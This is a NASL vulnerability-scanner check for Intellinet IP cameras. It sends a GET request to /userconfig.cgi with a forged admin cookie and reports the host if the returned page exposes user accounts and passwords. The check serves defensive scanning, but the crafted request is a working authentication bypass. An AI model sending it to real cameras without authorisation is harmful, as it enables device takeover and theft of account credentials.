############################################################
# Author: ox50sec@webray.com.cn
# Copyright @WebRAY
############################################################
include("compat.inc");


if(description)
{
 script_id(51799092);
 name = "Intellinet-network IP CAMERA - Add any account";
 script_name(name);
 script_category(ACT_ATTACK);
 script_family(english:"Camera");
 script_set_attribute(attribute:"risk_factor", value:"High");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_set_attribute(attribute:"description", value:"intellinet-network IP CAMERA, Any account can be added, deleted, modified and checked through get request to take over the whole device.");
 script_set_attribute(attribute:"solution", value:"1. Limited directory. 2. The white list restricts the readable path. 3. The white list is limited to login IP.");
 script_end_attributes();
 exit(0);
}


#
# The script code starts here
#
include("http_func.inc");
include("http_keepalive.inc");
include("global_settings.inc");
include("misc_func.inc");
include("openvas-https.inc");


function check_vuln(port){
	host1 = get_host_name( );
	if( port==80 ) host=host1;
        else host = string(host1,":",port);
	req = 'GET /userconfig.cgi HTTP/1.1\r\n' +
	'Host: ' + host + '\r\n' +
      'Accept-Language: en-US,en;q=0.5\r\n' +
	  'Accept-Encoding: gzip, deflate\r\n' +
      'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n' +
	  'User-Agent: ' + OPENVAS_HTTP_USER_AGENT + '\r\n' +
      'Connection: close\r\n' +
      'Cookie: frame_rate=9; expansion=10; mode=10; user_id=admin; user_auth_code=; user_auth_level=43; behind_firewall=0; show_only_image=; behindfirewall=\r\n' +
      'Upgrade-Insecure-Requests: 1\r\n\r\n';
     
	buf = http_keepalive_send_recv(port:port,data:req,bodyonly:FALSE);
	if( buf == NULL) exit(0);
	con = req + buf;
	if( ">password<"><buf && "200 O"><buf && "User Configuration"><buf ){
		if (report_verbosity > 0) security_hole(port:port, extra:con);
			  else security_hole(port);
	}
}

function check_vuln_ssl(port){
	host1 = get_host_name( );
	if( port==443 ) host=host1;
        else host = string(host1,":",port);
	req = 'GET /userconfig.cgi HTTP/1.1\r\n' +
	'Host: ' + host + '\r\n' +
      'Accept-Language: en-US,en;q=0.5\r\n' +
	  'Accept-Encoding: gzip, deflate\r\n' +
      'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n' +
	  'User-Agent: ' + OPENVAS_HTTP_USER_AGENT + '\r\n' +
      'Connection: close\r\n' +
      'Cookie: frame_rate=9; expansion=10; mode=10; user_id=admin; user_auth_code=; user_auth_level=43; behind_firewall=0; show_only_image=; behindfirewall=\r\n' +
      'Upgrade-Insecure-Requests: 1\r\n\r\n';
    
	ssl_req = https_req_get(port:port,request:req);
	if( ssl_req == NULL) exit(0);
	con = req + ssl_req;
	if( "200 O"><ssl_req && ">password<"><ssl_req && "User Configuration"><ssl_req ){
		if (report_verbosity > 0) security_hole(port:port, extra:con);
			  else security_hole(port);
	}
}


##################################
kbs = get_kb_list("www/banner/*");
foreach k (keys(kbs)) {
	port = substr(k,11);
	ssl = get_kb_list("SSL/Transport/"+port);
	if(!ssl) {
   		check_vuln(port:port);
	} else {
   		check_vuln_ssl(port:port);
	}
}
